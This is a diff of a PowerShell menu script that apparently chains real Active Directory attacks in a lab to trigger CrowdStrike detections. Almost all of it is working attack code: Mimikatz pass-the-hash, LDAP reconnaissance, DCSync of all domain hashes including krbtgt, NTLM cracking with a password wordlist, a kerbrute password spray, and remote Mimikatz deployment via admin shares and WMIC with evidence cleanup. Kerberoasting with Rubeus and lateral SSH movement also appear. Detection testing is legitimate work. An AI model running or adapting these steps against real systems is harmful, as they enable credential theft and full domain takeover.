+                                $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
+                                if ($tcp.Connected) {
+                                    Write-Host "    Port $port : OPEN" -ForegroundColor Green
+                                    $openPorts += $port
+                                }
+                            } catch { }
+                            $tcp.Close()
+                        }
+                        if ($openPorts.Count -eq 0) { Write-Host "    No open ports" -ForegroundColor DarkGray }
+
+                        $role = ""
+                        if ($openPorts -contains 88 -and $openPorts -contains 389) { $role = "DOMAIN CONTROLLER" }
+                        elseif ($openPorts -contains 3389 -and $openPorts -contains 445) { $role = "WORKSTATION/SERVER" }
+                        elseif ($ip -eq $gateway) { $role = "GATEWAY" }
+                        if ($role) { Write-Host "    >> Identified: $role" -ForegroundColor Cyan }
+
+                        $discovered += [PSCustomObject]@{ IP = $ip; Role = $role; Ports = ($openPorts -join ',') }
+                    }
+
+                    Write-Host "`n--- Summary ---" -ForegroundColor Yellow
+                    foreach ($h in $discovered) {
+                        $label = if ($h.Role) { " [$($h.Role)]" } else { "" }
+                        $ports = if ($h.Ports) { " Ports: $($h.Ports)" } else { " (no open ports)" }
+                        Write-Host "  $($h.IP)${label}${ports}" -ForegroundColor $(if ($h.Role -eq "DOMAIN CONTROLLER") { "Red" } elseif ($h.Role) { "Yellow" } else { "Gray" })
+                    }
+
+                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
+                }
+
+                # --- 4d: LDAP Recon via PtH ---
+                if ($sub -eq '4' -or $sub -eq 'A' -or $sub -eq 'a') {
+                    Write-Host "`n--- 4d: LDAP Reconnaissance via PtH ---" -ForegroundColor Yellow
+                    Write-Host "  Triggers: PassTheHash + LDAP enumeration" -ForegroundColor Yellow
+                    Write-Host
+
+                    $clarkHash = Get-ClarkHash
+                    if (-not $clarkHash) {
+                        Write-Host "  [!] Need clark.monroe hash. Run 4b first." -ForegroundColor Red
+                        pause; continue
+                    }
+
+                    $ldapScript = @'
 $ErrorActionPreference = "Continue"
 $dcIP = $env:ENV_DC_IP
 $idpDir = "C:\IDP_Files"
@@ -388,255 +540,48 @@ try {
 Write-Host "`nPress any key to close..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 '@
-            $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII
-            # Inject actual DC IP (PtH child process may not inherit env vars)
-            (Get-Content "$idpDir\ldap_recon.ps1") -replace '\$env:ENV_DC_IP', "'$($env:ENV_DC_IP)'" | Set-Content "$idpDir\ldap_recon.ps1" -Encoding ASCII
+                    $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII
+                    (Get-Content "$idpDir\ldap_recon.ps1") -replace '\$env:ENV_DC_IP', "'$($env:ENV_DC_IP)'" | Set-Content "$idpDir\ldap_recon.ps1" -Encoding ASCII
 
-            # Create a batch launcher (mimikatz /run: only takes a single exe, no args)
-            $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
-            $batContent | Out-File -FilePath "$idpDir\run_ldap_recon.bat" -Encoding ASCII
+                    $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
+                    $batContent | Out-File -FilePath "$idpDir\run_ldap_recon.bat" -Encoding ASCII
 
-            Write-Host "  Launching PtH clark.monroe -> LDAP recon..." -ForegroundColor White
-            Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
-            Write-Host
+                    Write-Host "  Launching PtH clark.monroe -> LDAP recon..." -ForegroundColor White
+                    Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
+                    Write-Host
 
-            $clarkHash = Get-ClarkHash
-            if (-not $clarkHash) { break }
+                    & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"
 
-            # PtH to spawn batch file in clark.monroe context
-            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"
+                    Write-Host "`n[+] LDAP recon launched in PtH context." -ForegroundColor Green
+                    Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
 
-            Write-Host "`n[+] LDAP recon launched in PtH context." -ForegroundColor Green
-            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
-            Write-Host "[*] User list will be saved to $idpDir\ldap_users.txt" -ForegroundColor Cyan
+                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
+                }
+
+                if ($sub -eq 'A' -or $sub -eq 'a') {
+                    Write-Host "`n[+] All Step 4 sub-steps complete." -ForegroundColor Green
+                    pause
+                    $step4Done = $true
+                }
+
+            } until ($step4Done)
         }
 
-        '4' {
-            Clear-Host
-            Write-Host "[Step 4] Hash Cracking + Credential Scanning" -ForegroundColor Cyan
-            Write-Host "         Step 4a: Crack demo account NTLM hash from Step 1 dump" -ForegroundColor Gray
-            Write-Host "         Step 4b: Spray cracked password via kerbrute" -ForegroundColor Gray
-            Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
-            Write-Host
-
-            # --- Step 4a: Crack the demo NTLM hash ---
-            Write-Host "--- 4a: NTLM Hash Cracking ---" -ForegroundColor Yellow
-            Write-Host
-
-            # Try to extract demo hash from Step 1 dump log
-            $demoHash = $null
-            $dumpLog = "$idpDir\step1_cred_dump.log"
-            if (Test-Path $dumpLog) {
-                $logContent = Get-Content $dumpLog -Raw
-                # Match SAM dump pattern: User : demo ... Hash NTLM: <hash>
-                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
-                    $demoHash = $Matches[1].ToLower()
-                    Write-Host "  [+] Extracted demo NTLM from Step 1 dump: $demoHash" -ForegroundColor Green
-                }
-            }
-
-            if (-not $demoHash) {
-                Write-Host "  [*] Could not auto-extract demo hash from dump log." -ForegroundColor Yellow
-                $demoHash = Read-Host "  Enter the demo account NTLM hash (from Step 1)"
-            }
-
-            if (-not $demoHash -or $demoHash.Length -ne 32) {
-                Write-Host "  [!] Invalid hash. Run Step 1 first to dump credentials." -ForegroundColor Red
-                Write-Host "  [*] You can also manually enter a password for kerbrute below." -ForegroundColor Gray
-            }
-
-            $crackedPw = $null
-            if ($demoHash -and $demoHash.Length -eq 32) {
-                Write-Host
-                Write-Host "  [*] Attempting offline dictionary attack against NTLM hash..." -ForegroundColor White
-                Write-Host "  [*] Testing common passwords..." -ForegroundColor Gray
-                Write-Host
-
-                # NTLM = MD4(UTF-16LE(password)) - compute and compare
-                # Load wordlist from external file, fallback to small embedded list
-                if (Test-Path $wordlistFile) {
-                    $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
-                    Write-Host "  [*] Loaded $($wordlist.Count) passwords from $wordlistFile" -ForegroundColor Gray
-                } else {
-                    Write-Host "  [*] No wordlist.txt found, using built-in mini list" -ForegroundColor Gray
-                    Write-Host "  [*] Drop a larger wordlist at $wordlistFile for better results" -ForegroundColor Gray
-                    $wordlist = @(
-                        "password", "Password1", "Password123", "Welcome1", "Welcome123",
-                        "Changeme1", "Changeme123", "Summer2024", "Winter2024", "Spring2024",
-                        "P@ssw0rd", "P@ssword1", "Admin123", "admin", "letmein",
-                        "qwerty123", "abc123", "monkey123", "dragon", "master",
-                        "demo", "Demo", "Demo1", "Demo123", "demo123",
-                        "DemoUser1", "DemoPass1", "D3mo!", "demo!@#",
-                        "CrowdStrike1", "Falcon123", "Test1234", "test", "Test123",
-                        "Company1", "Company123", "Passw0rd!", "Passw0rd",
-                        "1234567890", "Football1", "Baseball1", "iloveyou",
-                        "trustno1", "shadow", "sunshine", "princess",
-                        "!@#$%^&*", "Aa123456", "Zaq12wsx", "Qwerty1!"
-                    )
-                }
-
-                # MD4 via .NET (used by NTLM)
-                Add-Type -TypeDefinition @"
-using System;
-using System.Text;
-using System.Security.Cryptography;
-public class NTLM {
-    public static string Hash(string password) {
-        byte[] data = Encoding.Unicode.GetBytes(password);
-        // MD4 via BCrypt
-        byte[] hash;
-        using (var md4 = System.Security.Cryptography.MD4.Create()) {
-            hash = md4.ComputeHash(data);
-        }
-        return BitConverter.ToString(hash).Replace("-","").ToLower();
-    }
-}
-"@ -ErrorAction SilentlyContinue
-
-                # Fallback: use mimikatz or manual MD4 if .NET MD4 unavailable
-                $useFallback = $false
-                try {
-                    $testHash = [NTLM]::Hash("test")
-                    if (-not $testHash) { $useFallback = $true }
-                } catch {
-                    $useFallback = $true
-                }
-
-                if ($useFallback) {
-                    # Manual MD4 in PowerShell (pure implementation)
-                    Write-Host "  [*] Using built-in MD4 implementation..." -ForegroundColor Gray
-                    function Get-NTLMHash {
-                        param([string]$Password)
-                        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Password)
-                        # Use Windows CryptoAPI via P/Invoke
-                        Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class CryptoMD4 {
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptDestroyHash(IntPtr hHash);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
-
-    public static string ComputeMD4(byte[] data) {
-        IntPtr hProv = IntPtr.Zero;
-        IntPtr hHash = IntPtr.Zero;
-        // PROV_RSA_FULL=1, CRYPT_VERIFYCONTEXT=0xF0000000, CALG_MD4=0x8002
-        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
-        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
-        CryptHashData(hHash, data, (uint)data.Length, 0);
-        byte[] hash = new byte[16];
-        uint len = 16;
-        CryptGetHashParam(hHash, 2, hash, ref len, 0);
-        CryptDestroyHash(hHash);
-        CryptReleaseContext(hProv, 0);
-        return BitConverter.ToString(hash).Replace("-","").ToLower();
-    }
-}
-"@ -ErrorAction SilentlyContinue
-                        return [CryptoMD4]::ComputeMD4($bytes)
-                    }
-                }
-
-                $attempts = 0
-                $startTime = Get-Date
-                foreach ($pw in $wordlist) {
-                    $attempts++
-                    try {
-                        if ($useFallback) {
-                            $computed = Get-NTLMHash -Password $pw
-                        } else {
-                            $computed = [NTLM]::Hash($pw)
-                        }
-
-                        if ($computed -eq $demoHash) {
-                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
-                            Write-Host "  [+] CRACKED! Password: $pw" -ForegroundColor Green
-                            Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
-                            Write-Host "  [+] Hash match: $computed = $demoHash" -ForegroundColor DarkGreen
-                            $crackedPw = $pw
-                            # Save cracked password for Step 5 (RDP)
-                            $crackedPw | Out-File -FilePath "$idpDir\demo_password.txt" -Encoding ASCII
-                            Write-Host "  [+] Password saved to $idpDir\demo_password.txt" -ForegroundColor Green
-                            break
-                        }
-                    } catch {
-                        # Skip hash computation errors
-                    }
-
-                    # Progress every 10 attempts
-                    if ($attempts % 10 -eq 0) {
-                        Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray
-                    }
-                }
-
-                if (-not $crackedPw) {
-                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
-                    Write-Host "  [-] Exhausted wordlist ($attempts passwords in $([math]::Round($elapsed,2))s)" -ForegroundColor Yellow
-                    Write-Host "  [*] Try a larger wordlist (rockyou.txt) offline with hashcat:" -ForegroundColor Gray
-                    Write-Host "      hashcat -m 1000 $demoHash /usr/share/wordlists/rockyou.txt" -ForegroundColor Gray
-                }
-            }
-
-            # --- Step 4b: kerbrute password spray ---
-            Write-Host
-            Write-Host "--- 4b: Kerbrute Password Spray ---" -ForegroundColor Yellow
-            Write-Host
-
-            # Use LDAP-harvested list if available, fallback to static list
-            $userFile = "$idpDir\ldap_users.txt"
-            if (-not (Test-Path $userFile)) {
-                $userFile = "$idpDir\users.txt"
-                Write-Host "  Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
-            } else {
-                Write-Host "  Using LDAP-harvested user list" -ForegroundColor Green
-            }
-            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
-            Write-Host
-
-            if ($crackedPw) {
-                Write-Host "  [+] Using cracked password: $crackedPw" -ForegroundColor Green
-                $sprayPw = $crackedPw
-            } else {
-                $sprayPw = Read-Host "  Enter password to spray (or press Enter to skip)"
-            }
-
-            if ($sprayPw) {
-                Write-Host
-                Write-Host "  [*] Spraying $sprayPw against all users via Kerberos pre-auth..." -ForegroundColor White
-                Write-Host "  [*] This will trigger CredentialScanningActiveDirectory in CrowdStrike IDP" -ForegroundColor Yellow
-                Write-Host
-
-                try {
-                    $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
-                        -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
-                        -NoNewWindow -Wait -PassThru
-                    Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
-                } catch {
-                    Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red
-                }
-            } else {
-                Write-Host "  [*] Skipped. Moving to PtH-based attacks." -ForegroundColor Cyan
-            }
-
-            Write-Host
-            Write-Host "[*] Next: Step 5 (PtH clark.monroe -> remote dump on DT)." -ForegroundColor Cyan
-        }
-
+        # ================================================================
+        # STEP 5: ATTACK DC - DCSync (Active)
+        # ================================================================
         '5' {
-            Clear-Host
-            Write-Host "[Step 5] PtH clark.monroe -> Remote Enum + Dump on DT" -ForegroundColor Cyan
-            Write-Host "         Domain Admin access via PtH -> SMB + WMIC" -ForegroundColor Gray
-            Write-Host "         Triggers: PassTheHash, lateral tool transfer, LSASS access" -ForegroundColor Yellow
-            Write-Host
+            Show-StepBanner -Step "5" -Title "ATTACK DOMAIN CONTROLLER - DCSYNC" -Lines @(
+                "Using clark.monroe (Domain Admin) NTLM hash from Step 4,"
+                "the attacker performs Pass-the-Hash to authenticate to"
+                "the DC at $($env:ENV_DC_IP)."
+                ""
+                "DCSync replicates the AD database, extracting NTLM hashes"
+                "for ALL domain accounts including:"
+                "  - krbtgt (enables Golden Ticket attacks)"
+                "  - Administrator"
+                "  - All service and user accounts"
+            ) -Detection "CrowdStrike IDP: PassTheHash, DCSync (directory replication from non-DC)"
 
             $clarkHash = Get-ClarkHash
             if (-not $clarkHash) { break }
@@ -644,265 +589,111 @@ public class CryptoMD4 {
             Write-Host "  User:   clark.monroe (Domain Admin)" -ForegroundColor White
             Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
             Write-Host "  NTLM:   $clarkHash" -ForegroundColor White
-            Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
+            Write-Host "  Target: $env:ENV_DC_IP (DC)" -ForegroundColor White
             Write-Host
 
-            # Build script that runs in PtH context — inject actual DT IP
-            $scriptLines = @(
-                '$ErrorActionPreference = "Continue"'
-                "`$target = `"$($env:ENV_DT)`""
-                '$mimiExe = "C:\IDP_Files\Mimikatz\x64\mimikatz.exe"'
-                '$remotePath = "\\$target\C$\Temp"'
-                '$remoteMimi = "$remotePath\mimikatz.exe"'
-                '$dumpLog = "$remotePath\cred_dump.log"'
-                '$localDump = "C:\IDP_Files\dt_cred_dump.log"'
-                ''
-                'Write-Host ""'
-                'Write-Host "=== Remote Enum + Dump on $target ===" -ForegroundColor Cyan'
-                'Write-Host ""'
-                ''
-                '# --- 5a: Remote account enumeration ---'
-                'Write-Host "--- 5a: Remote Account Enumeration ---" -ForegroundColor Yellow'
-                'Write-Host ""'
-                'Write-Host "  [*] Listing remote shares ..." -ForegroundColor White'
-                'net view /all \\$target 2>&1 | ForEach-Object { Write-Host "  $_" }'
-                'Write-Host ""'
-                ''
-                'Write-Host "  [*] Querying logged-on sessions ..." -ForegroundColor White'
-                'try { query session /server:$target 2>&1 | ForEach-Object { Write-Host "  $_" } } catch { Write-Host "  [!] query session failed" -ForegroundColor Red }'
-                'Write-Host ""'
-                ''
-                'Write-Host "  [*] Listing local accounts ..." -ForegroundColor White'
-                'try { wmic /node:$target useraccount get Name,SID 2>&1 | ForEach-Object { Write-Host "  $_" } } catch { Write-Host "  [!] WMIC failed" -ForegroundColor Red }'
-                'Write-Host ""'
-                ''
-                'Write-Host "  [*] Listing services with domain accounts ..." -ForegroundColor White'
-                'try { wmic /node:$target service get Name,StartName,State 2>&1 | ForEach-Object { Write-Host "  $_" } } catch { Write-Host "  [!] WMIC failed" -ForegroundColor Red }'
-                'Write-Host ""'
-                ''
-                '# --- 5b: Copy mimikatz to DT via admin share ---'
-                'Write-Host "--- 5b: Lateral Tool Transfer ---" -ForegroundColor Yellow'
-                'Write-Host ""'
-                'New-Item -Path $remotePath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null'
-                'Write-Host "  [*] Copying mimikatz to \\$target\C$\Temp\ ..." -ForegroundColor White'
-                'try {'
-                '    Copy-Item $mimiExe $remoteMimi -Force'
-                '    Write-Host "  [+] Mimikatz copied to DT." -ForegroundColor Green'
-                '} catch {'
-                '    Write-Host "  [!] Copy failed: $_" -ForegroundColor Red'
-                '    Write-Host "  Press any key..." -ForegroundColor Gray'
-                '    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown"); exit 1'
-                '}'
-                'Write-Host ""'
-                ''
-                '# --- 5c: Remote execution via WMIC (batch wrapper avoids quoting issues) ---'
-                'Write-Host "--- 5c: Remote Mimikatz Execution (WMIC) ---" -ForegroundColor Yellow'
-                'Write-Host ""'
-                'Write-Host "  [*] Writing run_dump.bat on $target ..." -ForegroundColor White'
-                '$batLine1 = [char]64 + "echo off"'
-                '$batLine2 = "C:\Temp\mimikatz.exe privilege::debug `"log C:\Temp\cred_dump.log`" token::elevate lsadump::sam sekurlsa::logonpasswords exit"'
-                'Set-Content -Path "\\$target\C$\Temp\run_dump.bat" -Value @($batLine1, $batLine2) -Encoding ASCII'
-                'Write-Host "  [+] run_dump.bat written." -ForegroundColor Green'
-                'Write-Host ""'
-                'Write-Host "  [*] Executing run_dump.bat on $target via WMIC ..." -ForegroundColor White'
-                'Write-Host "  [*] Triggers: LSASS access + credential dumping on EDR-managed DT" -ForegroundColor Yellow'
-                'try {'
-                '    wmic /node:$target process call create "cmd.exe /c C:\Temp\run_dump.bat" 2>&1 | ForEach-Object { Write-Host "  $_" }'
-                '    Write-Host ""'
-                '    Write-Host "  [*] Waiting 15 seconds for remote execution ..." -ForegroundColor Gray'
-                '    Start-Sleep -Seconds 15'
-                '} catch { Write-Host "  [!] WMIC exec failed: $_" -ForegroundColor Red }'
-                'Write-Host ""'
-                ''
-                '# --- 5d: Retrieve and parse dump ---'
-                'Write-Host "--- 5d: Retrieve + Parse Dump ---" -ForegroundColor Yellow'
-                'Write-Host ""'
-                'try {'
-                '    Copy-Item $dumpLog $localDump -Force'
-                '    Write-Host "  [+] Dump retrieved: $localDump" -ForegroundColor Green'
-                '} catch {'
-                '    Write-Host "  [!] Could not retrieve dump: $_" -ForegroundColor Red'
-                '    Write-Host "  [*] mimikatz may still be running, try again in a few seconds." -ForegroundColor Gray'
-                '    Write-Host "  Press any key..." -ForegroundColor Gray'
-                '    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown"); exit 1'
-                '}'
-                'Write-Host ""'
-                ''
-                '$content = Get-Content $localDump -Raw'
-                'Write-Host "  --- Raw dump (first 60 lines) ---" -ForegroundColor Gray'
-                'Get-Content $localDump -TotalCount 60 | ForEach-Object { Write-Host "  $_" -ForegroundColor DarkGray }'
-                'Write-Host ""'
-                'Write-Host "  --- Accounts with NTLM hashes ---" -ForegroundColor Yellow'
-                '$pattern = "(?ms)Username\s*:\s*(\S+)\s*\*\s*Domain\s*:\s*\S+\s*\*\s*NTLM\s*:\s*([0-9a-fA-F]{32})"'
-                '$found = [regex]::Matches($content, $pattern)'
-                '$seen = @{}'
-                'foreach ($m in $found) {'
-                '    $u = $m.Groups[1].Value'
-                '    $h = $m.Groups[2].Value'
-                '    if ($u -notmatch ''\$'' -and -not $seen[$u]) {'
-                '        $seen[$u] = $true'
-                '        $color = if ($u -match "svc_runbook") { "Green" } else { "White" }'
-                '        Write-Host "    $u : $h" -ForegroundColor $color'
-                '    }'
-                '}'
-                ''
-                '# Extract svc_runbook hash'
-                'if ($content -match "svc_runbook[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {'
-                '    $svcHash = $Matches[1].ToLower()'
-                '    $svcHash | Out-File -FilePath "C:\IDP_Files\svc_runbook_hash.txt" -Encoding ASCII'
-                '    Write-Host ""'
-                '    Write-Host "  [+] svc_runbook NTLM FOUND: $svcHash" -ForegroundColor Green'
-                '    Write-Host "  [+] Hash saved - Steps 7, 8, 9 will use it automatically." -ForegroundColor Green'
-                '} else {'
-                '    Write-Host ""'
-                '    Write-Host "  [-] svc_runbook not found in dump." -ForegroundColor Yellow'
-                '    Write-Host "  [*] svc_runbook may not be logged on DT." -ForegroundColor Gray'
-                '}'
-                ''
-                '# Cleanup'
-                'Write-Host ""'
-                'Write-Host "  [*] Cleaning up on DT ..." -ForegroundColor Gray'
-                'Remove-Item $remoteMimi -Force -ErrorAction SilentlyContinue'
-                'Remove-Item $dumpLog -Force -ErrorAction SilentlyContinue'
-                'Remove-Item "\\$target\C$\Temp\run_dump.bat" -Force -ErrorAction SilentlyContinue'
-                'Write-Host "  [+] Done." -ForegroundColor Green'
-                ''
-                'Write-Host ""'
-                'Write-Host "Press any key to close..." -ForegroundColor Gray'
-                '$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")'
+            # Generate DCSync batch file dynamically (inject actual values)
+            $dcSyncBat = @(
+                "@echo off"
+                "echo [*] DCSync against $env:ENV_DC_IP ($env:ENV_DOMAIN)..."
+                "echo."
+                "`"$mimiExe`" `"privilege::debug`" `"log $idpDir\dcsync_output.log`" `"lsadump::dcsync /domain:$env:ENV_DOMAIN /all /csv`" `"exit`""
+                "echo."
+                "echo [+] DCSync complete. Output: $idpDir\dcsync_output.log"
+                "pause"
             )
-            $scriptLines -join "`r`n" | Out-File -FilePath "$idpDir\remote_dump_dt.ps1" -Encoding ASCII
-            '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\remote_dump_dt.ps1' | Out-File -FilePath "$idpDir\run_remote_dump_dt.bat" -Encoding ASCII
+            $dcSyncBat -join "`r`n" | Out-File -FilePath "$idpDir\Post_PtH_DCSync.bat" -Encoding ASCII
 
-            Write-Host "  [*] Launching PtH clark.monroe -> remote enum + dump on DT..." -ForegroundColor White
-            Write-Host "  [*] A new window will open with results." -ForegroundColor Gray
+            Write-Host "  [*] Launching PtH clark.monroe -> DCSync..." -ForegroundColor White
+            Write-Host "  [*] A new window will execute DCSync against the DC." -ForegroundColor Gray
             Write-Host
 
-            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_remote_dump_dt.bat" "exit"
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\Post_PtH_DCSync.bat`""
 
+            Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
+            Write-Host "[*] Output will be saved to $idpDir\dcsync_output.log" -ForegroundColor Cyan
             Write-Host
-            Write-Host "[+] Remote dump launched. Check the new window." -ForegroundColor Green
-            Write-Host "[*] svc_runbook hash will be saved automatically if found." -ForegroundColor Cyan
-            Write-Host
-            Write-Host "[*] If auto-extraction fails, enter manually:" -ForegroundColor Gray
-            $manualSvc = Read-Host "  svc_runbook NTLM (or Enter to skip)"
-            if ($manualSvc -and $manualSvc.Length -eq 32) {
-                $manualSvc | Out-File -FilePath $svcHashFile -Encoding ASCII
-                Write-Host "[+] Hash saved." -ForegroundColor Green
-            }
+            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
         }
 
+        # ================================================================
+        # STEP 6: LATERAL MOVEMENT TO UBUNTU (Active)
+        # ================================================================
         '6' {
-            Clear-Host
-            Write-Host "[Step 6] Enter svc_runbook hash manually" -ForegroundColor Cyan
-            Write-Host "         Use this if Step 5 auto-extraction failed." -ForegroundColor Gray
+            Show-StepBanner -Step "6" -Title "LATERAL MOVEMENT TO UBUNTU - CLOUD DETECTIONS" -Lines @(
+                "The attacker moves laterally from the Windows domain to"
+                "the Ubuntu server at $($env:ENV_UBUNTU)."
+                ""
+                "On Ubuntu, pre-staged scripts trigger cloud detections:"
+                ""
+                "  1. Log4Shell behavioral detection (JNDI injection)"
+                "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh"
+                ""
+                "  2. S3 bucket logging disabled"
+                "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh"
+                ""
+                "  S3 bucket: warp-duck-private-bucket-d14afc48"
+            ) -Detection "CrowdStrike: Log4Shell IoA, S3 bucket logging change, lateral movement"
+
+            Write-Host "  --- SSH Connection ---" -ForegroundColor Yellow
+            Write-Host
+            Write-Host "  Target: $env:ENV_UBUNTU" -ForegroundColor White
+            Write-Host
+            Write-Host "  Run this command to connect:" -ForegroundColor Cyan
+            Write-Host "    ssh ubuntu@$env:ENV_UBUNTU" -ForegroundColor Green
+            Write-Host
+            Write-Host "  Once connected, run these scripts:" -ForegroundColor Cyan
+            Write-Host
+            Write-Host "  1) Log4Shell behavioral IoA:" -ForegroundColor White
+            Write-Host "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh" -ForegroundColor Green
+            Write-Host
+            Write-Host "  2) S3 bucket logging disabled:" -ForegroundColor White
+            Write-Host "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh" -ForegroundColor Green
             Write-Host
 
-            if (Test-Path $svcHashFile) {
-                $existing = (Get-Content $svcHashFile -First 1).Trim()
-                Write-Host "  [+] Current saved hash: $existing" -ForegroundColor Green
-                Write-Host
-            }
-
-            $svcHash = Read-Host "  Enter svc_runbook NTLM hash (32 hex chars)"
-            if ($svcHash -and $svcHash.Length -eq 32) {
-                $svcHash | Out-File -FilePath $svcHashFile -Encoding ASCII
-                Write-Host "[+] Hash saved. Steps 7, 8, 9 will use it." -ForegroundColor Green
-            } elseif ($svcHash) {
-                Write-Host "[!] Invalid hash (need 32 hex characters)." -ForegroundColor Red
-            } else {
-                Write-Host "[*] Skipped." -ForegroundColor Yellow
+            $launchSSH = Read-Host "  Launch SSH now? (y/N)"
+            if ($launchSSH -eq 'y') {
+                $sshUser = Read-Host "  SSH username (default: ubuntu)"
+                if (-not $sshUser) { $sshUser = "ubuntu" }
+                try {
+                    Start-Process -FilePath "ssh" -ArgumentList "$sshUser@$env:ENV_UBUNTU"
+                    Write-Host "  [+] SSH launched." -ForegroundColor Green
+                } catch {
+                    Write-Host "  [!] SSH client not available. Connect manually." -ForegroundColor Red
+                    Write-Host "  [*] Try: ssh $sshUser@$env:ENV_UBUNTU" -ForegroundColor Gray
+                }
             }
         }
 
-        '7' {
+        # ================================================================
+        # C: CONFIGURE IPs
+        # ================================================================
+        'C' {
             Clear-Host
-            Write-Host "[Step 7] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
-            Write-Host "         Requesting TGS via PtH context..." -ForegroundColor Gray
-            Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
+            Write-Host "`n--- Current Configuration ---" -ForegroundColor Cyan
+            Write-Host "  ENV_DOMAIN   = $env:ENV_DOMAIN" -ForegroundColor White
+            Write-Host "  ENV_DC_IP    = $env:ENV_DC_IP" -ForegroundColor White
+            Write-Host "  ENV_DT       = $env:ENV_DT" -ForegroundColor White
+            Write-Host "  ENV_FORTI_IP = $env:ENV_FORTI_IP" -ForegroundColor White
+            Write-Host "  ENV_UBUNTU   = $env:ENV_UBUNTU" -ForegroundColor White
             Write-Host
 
-            $clarkHash = Get-ClarkHash
-            if (-not $clarkHash) { break }
-
-            if (Test-Path "$idpDir\Rubeus.exe") {
-                # Rubeus supports /rc4: for hash-based auth
-                Write-Host "  Using Rubeus with clark.monroe hash..." -ForegroundColor White
-                & "$idpDir\Rubeus.exe" kerberoast /user:svc_runbook /domain:$env:ENV_DOMAIN /dc:$env:ENV_DC_IP /rc4:$clarkHash /outfile:"$idpDir\kerberoast_hashes.txt"
-                Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
-            }
-            else {
-                # Fallback: PtH -> spawn mimikatz kerberos::ask
-                Write-Host "  Rubeus not found. Using mimikatz PtH -> kerberos::ask..." -ForegroundColor Yellow
-                "$mimiExe `"privilege::debug`" `"kerberos::ask /target:web/svc_runbook`" `"exit`"" | Out-File -FilePath "$idpDir\run_kerberoast.bat" -Encoding ASCII
